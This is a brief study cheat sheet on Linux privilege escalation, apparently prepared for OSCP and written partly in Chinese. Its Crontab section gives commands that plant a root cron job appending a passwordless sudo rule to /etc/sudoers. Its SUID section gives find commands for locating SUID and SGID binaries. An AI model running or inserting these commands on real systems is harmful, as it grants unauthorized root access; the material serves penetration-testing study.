---
title: Linux Priv Esc
date: 2020-11-14 19:11:18
category: OSCP
---

# Linux 提权


### Kernel Vulns

### sudo -l


### Crontab
``` bash
vi user.sh
echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
```

`/etc/crontab` 中加入计划任务。
``` bash
vi /etc/crontab
*/1 * * * * root sh /path2script/user.sh >> /tmp/log.txt
```
最后
``` bash
sudo su
```


### SUID 
``` bash
find / -perm -1000 -type d 2>/dev/null              # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null               # 以文件所属用户组权限运行
find / -perm -u=s -type f 2>/dev/null               # 以文件所属用户权限运行
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # 以上两者合集

# Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done   

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null   
```